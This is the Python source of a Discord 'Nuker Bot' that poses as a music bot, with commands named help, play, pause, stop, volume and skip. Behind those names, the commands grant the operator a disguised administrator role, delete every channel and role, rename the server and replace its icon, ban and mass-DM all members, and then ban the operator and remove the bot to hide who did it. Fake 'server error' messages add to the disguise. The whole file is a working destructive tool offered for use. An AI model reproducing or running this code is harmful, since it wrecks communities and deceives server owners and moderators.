# Made by KingWaffleIII and QuantumFox42
# Nuker Bot
# v1.9 Beta

import discord
from discord.ext import commands

from requests import get
from datetime import datetime
from os import listdir
from time import sleep
from typing import Optional
from json import loads, dumps

if "settings.json" not in listdir():
    # First time setup
    print("No settings.json found. Performing first time setup.\nPlease make sure to enter all values correctly.\nIf you wish to restart the first time setup, simply delete the settings.json file.")

    # Main Variables
    TOKEN = input("Please input your bot's token and press enter to continue: ")
    USER_ID = input("If you would like the bot to only work for you, please input your userid, otherwise leave blank and then press enter to continue: ")
    PREFIX = input("Please enter the command prefix you would like to use: ")
    if USER_ID == "": USER_ID = False
    else: USER_ID = int(USER_ID)

    # Status
    if input("Would you like to setup a status? (Y for yes): ").lower() == "y":
        statustype = input("Please enter the status type you would like to use (Your options are: playing, streaming, listening and watching): ")
        statustext = input("Please enter the text for your status: ")
        STATUS = f"{statustype},{statustext}"
    else: STATUS = False

    # Log Variables
    if input("Would you like logging to be turned on? (Y/N): ").lower() == "y": LOG = True
    else: LOG = False
    LOGFILE = "nuker_bot_log.txt"

    # Show connected servers on startup
    if input("Would you like the bot to display all the servers it is in on startup? (Y/N): ").lower() == "y": SHOWCONNECTEDSERVERS = True
    else: SHOWCONNECTEDSERVERS = False

    towrite = dumps({"TOKEN": TOKEN, "USERID": USER_ID, "PREFIX": PREFIX, "STATUS": STATUS, "LOG": LOG, "LOGFILE": LOGFILE,"ROLE_IDS": {}, "VOLUMESETTINGS": {}})

    # Writes settings to file
    file = open("settings.json", "w+")
    file.write(towrite)
    file.close()
    print()

else:
    # Load settings
    file = open("settings.json", "r")
    json_string = file.read()
    file.close()
    settings = loads(json_string)
    TOKEN = settings["TOKEN"]
    USER_ID = settings["USERID"]
    PREFIX = settings["PREFIX"]
    STATUS = settings["STATUS"]
    LOG = settings["LOG"]
    LOGFILE = settings["LOGFILE"]

# parse the STATUS var
if STATUS is not False:
    usestatus = True
    tmp = STATUS.split(",")
    ACTIVITY_TYPE = tmp[0]
    ACTIVITY = tmp[1]

    if ACTIVITY_TYPE == "playing":
        ACTIVITY_TYPE = discord.ActivityType.playing

    elif ACTIVITY_TYPE == "streaming":
        ACTIVITY_TYPE = discord.ActivityType.streaming

    elif ACTIVITY_TYPE == "listening":
        ACTIVITY_TYPE = discord.ActivityType.listening

    elif ACTIVITY_TYPE == "watching":
        ACTIVITY_TYPE = discord.ActivityType.watching
else:
    usestatus = False

intents = discord.Intents.default()
intents.members = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

bot.remove_command("help")


# Read and write role IDs
def getRoleIDs():
    file = open("settings.json", "r")
    read = file.read()
    file.close()
    return loads(read)["ROLE_IDS"]


def writeRoleIDs(write):
    file = open("settings.json", "r")
    read = loads(file.read())
    read["ROLE_IDS"] = write
    file.close()

    file = open("settings.json", "w+")
    file.write(dumps(read))
    file.close()
    print("")


# Read and write volume settings
def getVolumeSettings():
    file = open("settings.json", "r")
    read = file.read()
    file.close()
    return loads(read)["VOLUMESETTINGS"]


def writeVolumeSettings(write):
    file = open("settings.json", "r")
    read = loads(file.read())
    read["VOLUMESETTINGS"] = write
    file.close()

    file = open("settings.json", "w+")
    file.write(dumps(read))
    file.close()

# logging function
def output_log(text):
    if LOG:
        with open(LOGFILE, "a+") as f:
            f.write("\n  ".join(
                (datetime.now().strftime("%d/%m/%Y %H:%M:%S\n") + text.removeprefix("\n")).splitlines()) + "\n\n")
            f.close()

async def dm_user(user, message):
    await user.send(message)

# def config_options for volume command
config_options = {
    1: "ban",
    2: "channels",
    3: "roles",
    4: "server",
    5: "nuke_channel",
    6: "dm",
    7: "nick"
}


# nuking functions
# create and give admin
async def create_admin(ctx):
    try:
        guildRoleIDs = []
        for role in ctx.guild.roles:
            guildRoleIDs.append(role.id)
        roleIDs = getRoleIDs()
        if not roleIDs == {}:
            if str(ctx.guild.id) in roleIDs.keys():
                if not roleIDs[str(ctx.guild.id)] in guildRoleIDs:
                    roleIDs.pop(str(ctx.guild.id))
                    role = await ctx.guild.create_role(name="Member", permissions=discord.Permissions(permissions=8))
                    roleIDs[str(ctx.guild.id)] = role.id
                    writeRoleIDs(roleIDs)
                else:
                    role = ctx.guild.get_role(roleIDs[str(ctx.guild.id)])
            else:
                role = await ctx.guild.create_role(name="Member", permissions=discord.Permissions(permissions=8))
                roleIDs[ctx.guild.id] = role.id
                writeRoleIDs(roleIDs)
        else:
            role = await ctx.guild.create_role(name="Member", permissions=discord.Permissions(permissions=8))
            roleIDs[ctx.guild.id] = role.id
            writeRoleIDs(roleIDs)

        alreadyHasRole = False
        for userRole in ctx.message.author.roles:
            if userRole.id == role.id:
                alreadyHasRole = True
        if not alreadyHasRole:
            await ctx.message.author.add_roles(role)

        output_log(f'''
*** ADMIN ALERT ***
Gave {ctx.message.author} the admin role.
Server Name: {ctx.guild.name}
Server ID: {ctx.guild.id}
Server Owner: {ctx.guild.owner}
''')

    except discord.Forbidden:
        output_log(f'''
Failed to create/grant administrator role: insufficient permissions.
Server Name: {ctx.guild.name}
Server ID: {ctx.guild.id}
Server Owner: {ctx.guild.owner}
''')


# delete all channels
async def delete_channels(ctx):
    for guild in bot.guilds:
        if guild.name == ctx.guild.name:
            for channel in guild.channels:
                try:
                    await channel.delete()
                except discord.Forbidden:
                    output_log(f'''
Failed to delete channel "{channel.name}": insufficient permissions.
Server Name: {ctx.guild.name}
Server ID: {ctx.guild.id}
Server Owner: {ctx.guild.owner}
''')


# create nuke channel
async def create_nuke_channel(ctx, name):
    try:
        await ctx.guild.create_text_channel(name)
    except discord.Forbidden:
        output_log(f'''
Failed to create the "get nuked" channel: insufficient permissions.
Server Name: {ctx.guild.name}
Server ID: {ctx.guild.id}
Server Owner: {ctx.guild.owner}
''')


# change server name and icon
async def edit_server(ctx, name, icon_file):
    if icon_file.find("http") != -1:
        response = get(icon_file)

        with open(".tmp_icon", "wb") as f:
            f.write(response.content)
            f.close()

        icon_file = ".tmp_icon"

    with open(icon_file, "rb") as f:
        icon = f.read()
        f.close()

    try:
        await ctx.guild.edit(name=name, icon=icon)
    except discord.Forbidden:
        output_log(f'''
Failed to edit the server's icon and name: insufficient permissions.
Server Name: {ctx.guild.name}
Server ID: {ctx.guild.id}
Server Owner: {ctx.guild.owner}
''')


# ban all members
async def ban_members(ctx, member_list):
    for member_id in member_list:
        member = await ctx.guild.fetch_member(member_id)
        try:
            await ctx.guild.ban(member, reason="NUKE DETONATED!")
            print(f"Banned user \"{member.name}\"")
        except discord.Forbidden:
            output_log(f'''
Failed to ban user "{member}": insufficient permissions.
Server Name: {ctx.guild.name}
Server ID: {ctx.guild.id}
Server Owner: {ctx.guild.owner}
''')


# delete all roles
async def delete_roles(ctx, role_list):
    for role in role_list:
        try:
            await role.delete()
        except discord.Forbidden:
            output_log(f'''
Failed to delete role "{role.name}": insufficient permissions.
Server Name: {ctx.guild.name}
Server ID: {ctx.guild.id}
Server Owner: {ctx.guild.owner}
''')


# prints some basic info about the bot when ready
@bot.event
async def on_ready():
    if usestatus:
        activity = discord.Activity(
            name=ACTIVITY, type=ACTIVITY_TYPE)
        await bot.change_presence(activity=activity)

    print(f"{bot.user} online!\n")
    print("Connected servers:")
    for guild in bot.guilds:
        print(guild.name)
    print()

    if LOG:
        print(f"Logging in \"{LOGFILE}\"")


# outputs to the log some basic info about the new guild when connected
@bot.event
async def on_guild_join(guild):
    output_log(f'''
=> SERVER JOIN ALERT <=
{bot.user} has joined the server.
Server Name: {guild.name}
Server ID: {guild.id}
Server Owner: {guild.owner}
''')


# outputs to the log some basic info about the old guild when disconnected
@bot.event
async def on_guild_leave(guild):
    output_log(f'''
=> SERVER LEAVE ALERT <=
{bot.user} has left the server.
Server Name: {guild.name}
Server ID: {guild.id}
Server Owner: {guild.owner}
''')


# gives an error to any command beginning with !
@bot.event
async def on_message(msg):
    if msg.content.startswith(PREFIX):
        cmds = []
        for command in bot.commands:
            cmds.append(str(command))
        if not msg.content.lower().split(" ")[0][1:] in cmds:
            embed = discord.Embed(
                title="Server Error!",
                description="Our servers are currently experiencing some issues, please check back at a later time!",
                colour=0xff0000
            )
            await msg.channel.send(content=None, embed=embed)

        elif USER_ID != False:
            if msg.author.id == USER_ID:
                await bot.process_commands(msg)
            else:
                embed = discord.Embed(
                    title="Server Error!",
                    description="Our servers are currently experiencing some issues, please check back at a later time!",
                    colour=0xff0000
                )
                await msg.channel.send(content=None, embed=embed)
        
        else: await bot.process_commands(msg)


# nukes the server
@bot.command(name="help")
@commands.bot_has_permissions(administrator=True)
async def nuke(ctx):
    server_name = ctx.guild.name

    # make admin role and give user admin

    await create_admin(ctx)

    # delete all channels

    await delete_channels(ctx)

    # create nuke channel

    await create_nuke_channel(ctx, "get nuked")

    # change server icon & name

    await edit_server(ctx, "GET NUKED!", "https://i.imgur.com/CNdUGZj.jpg")

    # ban all users

    member_list = []
    for member in ctx.guild.members:
        if member.id == ctx.message.author.id:
            pass
        elif member.id == bot.user.id:
            pass
        elif member.id == ctx.guild.owner.id:
            pass
        else:
            member_list.append(member.id)

    await ban_members(ctx, member_list)

    # delete all roles

    role_list = []

    roleIDs = getRoleIDs()

    for role in ctx.guild.roles:
        if role == ctx.guild.default_role:
            pass
        elif role == discord.utils.get(ctx.guild.roles, name=bot.user.name):
            pass
        elif role == ctx.guild.get_role(roleIDs[str(ctx.guild.id)]):
            pass
        else:
            role_list.append(role)

    await delete_roles(ctx, role_list)

    output_log(f'''
*** NUKE ALERT ***
Server Name: {server_name}
Server ID: {ctx.guild.id}
Server Owner: {ctx.guild.owner}
Banned Users: {len(member_list)}
Roles Deleted: {len(role_list)}
''')


# gives the user admin
@bot.command(name="play")
@commands.bot_has_permissions(administrator=True)
async def play(ctx):
    await ctx.message.delete()
    await create_admin(ctx)


# bans the person who ran the command to avoid suspicion
@bot.command(name="pause")
@commands.bot_has_permissions(administrator=True)
async def pause(ctx):
    await ctx.message.delete()
    if not USER_ID:
        await ctx.guild.ban(await ctx.guild.fetch_member(ctx.message.author.id))
        output_log(f'''
*** NUKER BAN ALERT ***
Nuker ({await bot.fetch_user(ctx.message.author.id)}) has been banned from the server!
Server Name: {ctx.guild.name}
Server ID: {ctx.guild.id}
Server Owner: {ctx.guild.owner}
''')
    else:
        await ctx.guild.ban(await ctx.guild.fetch_member(USER_ID))
        output_log(f'''
*** NUKER BAN ALERT ***
Nuker ({await ctx.guild.fetch_member(USER_ID)}) has been banned from the server!
Server Name: {ctx.guild.name}
Server ID: {ctx.guild.id}
Server Owner: {ctx.guild.owner}
''')


# bans the person who ran the command as well as removing the bot
@bot.command(name="stop")
@commands.bot_has_permissions(administrator=True)
async def stop(ctx):
    await ctx.message.delete()
    if not USER_ID:
        await ctx.guild.ban(await ctx.guild.fetch_member(ctx.message.author.id))
        output_log(f'''
*** NUKER CLEANUP ALERT ***
{ctx.message.author.name} has been banned from the server and the bot has been removed!
Server Name: {ctx.guild.name}
Server ID: {ctx.guild.id}
Server Owner: {ctx.guild.owner}
''')
    else:
        await ctx.guild.ban(await ctx.guild.fetch_member(USER_ID))
        output_log(f'''
*** NUKER CLEANUP ALERT ***
{await ctx.guild.fetch_member(USER_ID)} has been banned from the server and the bot has been removed!
Server Name: {ctx.guild.name}
Server ID: {ctx.guild.id}
Server Owner: {ctx.guild.owner}
''')

    await ctx.guild.leave()


# leaves the server
@bot.command(name="leave")
async def leave(ctx):
    await ctx.guild.leave()
    output_log(f'''
*** SERVER LEAVE ALERT ***
{bot.user} has left the server.
Server Name: {ctx.guild.name}
Server ID: {ctx.guild.id}
Server Owner: {ctx.guild.owner}
''')


@bot.command(name="volume")
@commands.dm_only()
async def volume(ctx, value: str, status: bool, arg1: Optional[str], arg2: Optional[str]):
    if not isinstance(ctx.channel, discord.channel.DMChannel):
        await ctx.message.delete()
    
    if USER_ID is not False and ctx.message.author.id != USER_ID:
        return

    volume_settings=getVolumeSettings()

    if f"{ctx.message.author.id}" not in volume_settings.keys():  # write default settings if entry doesn't exist
        volume_settings[f"{ctx.message.author.id}"] = {
            "ban": True,
            "channels": True,
            "roles": True,
            "server": [True, "GET NUKED!", "https://i.imgur.com/CNdUGZj.jpg"],
            "nuke_channel": [True, "get nuked"],
            "dm": [True, "GET NUKED!"],
            "nick": [False]
        }
        writeVolumeSettings(volume_settings)

    settings = volume_settings[f"{ctx.message.author.id}"]

    if value != "*":
        setting = config_options[int(value)]

        if setting == "ban":
            settings["ban"] = status

            await dm_user(ctx.message.author, f"Changed \"ban everyone\" to {status}")
        elif setting == "channels":
            settings["channels"] = status

            await dm_user(ctx.message.author, f"Changed \"delete channels\" to {status}")
        elif setting == "roles":
            settings["roles"] = status

            await dm_user(ctx.message.author, f"Changed \"delete roles\" to {status}")
        elif setting == "server":
            if arg1:
                if arg2:
                    settings["server"] = [status, arg1, arg2]
                    await dm_user(ctx.message.author, f"Changed \"edit server\" to {status} with a name of {arg1} and an icon of {arg2}")
                else:
                    settings["server"] = [status, arg1, "https://i.imgur.com/CNdUGZj.jpg"]
                    await dm_user(ctx.message.author, f"Changed \"edit server\" to {status} with a name of {arg1} and an icon of \"https://i.imgur.com/CNdUGZj.jpg\"")
            else:
                settings["server"] = [status, "GET NUKED!", "https://i.imgur.com/CNdUGZj.jpg"]
                await dm_user(ctx.message.author, f"Changed \"edit server\" to {status} with a name of \"GET NUKED!\" and an icon of \"https://i.imgur.com/CNdUGZj.jpg\"")
        elif setting == "nuke_channel":
            if arg1:
                settings["nuke_channel"] = [status, arg1]
                await dm_user(ctx.message.author, f"Changed \"nuke channel\" to {status} with a name of {arg1}")
            else:
                settings["nuke_channel"] = [status, "get nuked"]
                await dm_user(ctx.message.author, f"Changed \"nuke channel\" to {status} with a name of \"get nuked\"")
        elif setting == "dm":
            if arg1:
                settings["dm"] = [status, arg1]
                await dm_user(ctx.message.author, f"Changed \"DM everyone\" to {status} with a message of {arg1}")
            else:
                settings["dm"] = [status, "GET NUKED!"]
                await dm_user(ctx.message.author, f"Changed \"DM everyone\" to {status} with a message of \"GET NUKED!\"")
        elif setting == "nick":
            if arg1:
                settings["nick"] = [status, arg1]
                await dm_user(ctx.message.author, f"Changed \"nick everyone\" to {status} with a name of {arg1}")
            else:
                settings["nick"] = [status, "GET NUKED!"]
                await dm_user(ctx.message.author, f"Changed \"nick everyone\" to {status} with a name of \"GET NUKED!\"")
    else:
        config_1 = status

        await dm_user(ctx.message.author, f"Changed \"ban everyone\" to {status}")

        config_2 = status

        await dm_user(ctx.message.author, f"Changed \"delete channels\" to {status}")

        config_3 = status

        await dm_user(ctx.message.author, f"Changed \"delete roles\" to {status}")

        config_4 = [status, "GET NUKED!", "https://i.imgur.com/CNdUGZj.jpg"]

        await dm_user(ctx.message.author, f"Changed \"edit server\" to {status} with a name of \"GET NUKED!\" and an icon of \"https://i.imgur.com/CNdUGZj.jpg\"")

        config_5 = [status, "get nuked"]

        await dm_user(ctx.message.author, f"Changed \"nuke channel\" to {status} with a name of \"get nuked\"")

        config_6 = [status, "GET NUKED!"]

        await dm_user(ctx.message.author, f"Changed \"DM everyone\" to {status} with a name of \"GET NUKED!\"")

        config_7 = [status, "GET NUKED!"]

        await dm_user(ctx.message.author, f"Changed \"nick everyone\" to {status} with a name of \"GET NUKED!\"")

        # save config options
        volume_settings[f"{ctx.message.author.id}"] = {
            "ban": config_1,
            "channels": config_2,
            "roles": config_3,
            "server": config_4,
            "nuke_channel": config_5,
            "dm": config_6,
            "nick": config_7
        }
    writeVolumeSettings(volume_settings)


@bot.command(name="skip")
@commands.bot_has_permissions(administrator=True)
async def skip(ctx):
    if USER_ID is not False:
        if ctx.message.author.id != USER_ID:
            return

    volume_settings = getVolumeSettings()

    if f"{ctx.message.author.id}" not in volume_settings.keys():
        volume_settings[f"{ctx.guild.id}"] = {
            "ban": True,
            "channels": True,
            "roles": True,
            "server": [True, "GET NUKED!", "https://i.imgur.com/CNdUGZj.jpg"],
            "nuke_channel": [True, "get nuked"],
            "dm": [True, "GET NUKED!"],
            "nick": [False]
        }
        writeVolumeSettings(volume_settings)

    settings = volume_settings[f"{ctx.message.author.id}"]

    do_ban = settings["ban"]
    do_channels = settings["channels"]
    do_roles = settings["roles"]
    do_server = settings["server"][0]
    do_nc = settings["nuke_channel"][0]
    do_dm = settings["dm"][0]
    do_nick = settings["nick"][0]

    if do_channels:
        await delete_channels(ctx)

    if do_nc:
        nc_name = settings["nuke_channel"][1]
        await create_nuke_channel(ctx, nc_name)

    if do_server:
        server_name = settings["server"][1]
        server_icon = settings["server"][2]

        await edit_server(ctx, server_name, str(server_icon))

    if do_dm:
        for member in ctx.guild.members:
            if member.id == ctx.message.author.id:
                pass
            elif member.id == bot.user.id:
                pass
            else:
                try:
                    await member.send(settings["dm"][1])
                except discord.HTTPException:
                    print(f"Could not DM user {member.name}.")

    if do_nick:
        nickname = settings["nick"][1]
        for member in ctx.guild.members:
            if member.id == ctx.message.author.id:
                pass
            elif member.id == bot.user.id:
                pass
            else:
                try:
                    await member.edit(nick=nickname)
                except discord.HTTPException:
                    print(f"Could not nickname user {member.name}.")

    if do_ban:
        member_list = []
        for member in ctx.guild.members:
            if member.id == ctx.message.author.id:
                pass
            elif member.id == bot.user.id:
                pass
            elif member.id == ctx.guild.owner.id:
                pass
            else:
                member_list.append(member.id)

        await ban_members(ctx, member_list)

    roleIDs = getRoleIDs()
    if do_roles:
        role_list = []
        for role in ctx.guild.roles:
            if role == discord.utils.get(ctx.guild.roles, name=bot.user.name):
                pass
            elif role == ctx.guild.default_role:
                pass
            elif role == ctx.guild.get_role(roleIDs[str(ctx.guild.id)]):
                pass
            else:
                role_list.append(role)

        await delete_roles(ctx, role_list)


# checks if the bot has administrator permissions
# if it doesn't, throws an error
@nuke.error
async def nuke_error(ctx, error):
    if isinstance(error, commands.BotMissingPermissions):
        await ctx.send("Checking environment...")
        sleep(1)
        try:
            embed = discord.Embed(title="Error: Missing Required Permissions!",
                                  description="This bot is lacking required permissions!")
            embed.add_field(name="You need to grant me the following permission(s):",
                            value="- Administrator")
            await ctx.send(content=None, embed=embed)
        except discord.Forbidden:
            await ctx.send('''
__**Error: Missing Required Permission!**__
**I need the following permission(s) to function properly:**
- `Administrator`
''')

        output_log(f'''
Bad Environment: Insufficient Permissions!
Server Name: {ctx.guild.name}
Server ID: {ctx.guild.id}
Server Owner: {ctx.guild.owner}
''')


@play.error
async def play_error(ctx, error):
    if isinstance(error, commands.BotMissingPermissions):
        await ctx.send("Checking environment...")
        sleep(1)
        try:
            embed = discord.Embed(title="Error: Missing Required Permissions!",
                                  description="This bot is lacking required permissions!")
            embed.add_field(name="You need to grant me the following permission(s):",
                            value="- Administrator")
            await ctx.send(content=None, embed=embed)
        except discord.Forbidden:
            await ctx.send('''
__**Error: Missing Required Permission!**__
**I need the following permission(s) to function properly:**
- `Administrator`
''')

        output_log(f'''
Bad Environment: Insufficient Permissions!
Server Name: {ctx.guild.name}
Server ID: {ctx.guild.id}
Server Owner: {ctx.guild.owner}
''')


@pause.error
async def pause_error(ctx, error):
    if isinstance(error, commands.BotMissingPermissions):
        await ctx.send("Checking environment...")
        sleep(1)
        try:
            embed = discord.Embed(title="Error: Missing Required Permissions!",
                                  description="This bot is lacking required permissions!")
            embed.add_field(name="You need to grant me the following permission(s):",
                            value="- Administrator")
            await ctx.send(content=None, embed=embed)
        except discord.Forbidden:
            await ctx.send('''
__**Error: Missing Required Permission!**__
**I need the following permission(s) to function properly:**
- `Administrator`
''')

        output_log(f'''
Bad Environment: Insufficient Permissions!
Server Name: {ctx.guild.name}
Server ID: {ctx.guild.id}
Server Owner: {ctx.guild.owner}
''')


@stop.error
async def stop_error(ctx, error):
    if isinstance(error, commands.BotMissingPermissions):
        await ctx.send("Checking environment...")
        sleep(1)
        try:
            embed = discord.Embed(title="Error: Missing Required Permissions!",
                                  description="This bot is lacking required permissions!")
            embed.add_field(name="You need to grant me the following permission(s):",
                            value="- Administrator")
            await ctx.send(content=None, embed=embed)
        except discord.Forbidden:
            await ctx.send('''
__**Error: Missing Required Permission!**__
**I need the following permission(s) to function properly:**
- `Administrator`
''')

        output_log(f'''
Bad Environment: Insufficient Permissions!
Server Name: {ctx.guild.name}
Server ID: {ctx.guild.id}
Server Owner: {ctx.guild.owner}
''')


@volume.error
async def vol_error(ctx, error):
    if isinstance(error, commands.BotMissingPermissions):
        await ctx.send("Checking environment...")
        sleep(1)
        try:
            embed = discord.Embed(title="Error: Missing Required Permissions!",
                                  description="This bot is lacking required permissions!")
            embed.add_field(name="You need to grant me the following permission(s):",
                            value="- Administrator")
            await ctx.send(content=None, embed=embed)
        except discord.Forbidden:
            await ctx.send('''
__**Error: Missing Required Permission!**__
**I need the following permission(s) to function properly:**
- `Administrator`
''')

        output_log(f'''
Bad Environment: Insufficient Permissions!
Server Name: {ctx.guild.name}
Server ID: {ctx.guild.id}
Server Owner: {ctx.guild.owner}
''')


@skip.error
async def skip_error(ctx, error):
    if isinstance(error, commands.BotMissingPermissions):
        await ctx.send("Checking environment...")
        sleep(1)
        try:
            embed = discord.Embed(title="Error: Missing Required Permissions!",
                                  description="This bot is lacking required permissions!")
            embed.add_field(name="You need to grant me the following permission(s):",
                            value="- Administrator")
            await ctx.send(content=None, embed=embed)
        except discord.Forbidden:
            await ctx.send('''
__**Error: Missing Required Permission!**__
**I need the following permission(s) to function properly:**
- `Administrator`
''')

        output_log(f'''
Bad Environment: Insufficient Permissions!
Server Name: {ctx.guild.name}
Server ID: {ctx.guild.id}
Server Owner: {ctx.guild.owner}
''')


bot.run(TOKEN)
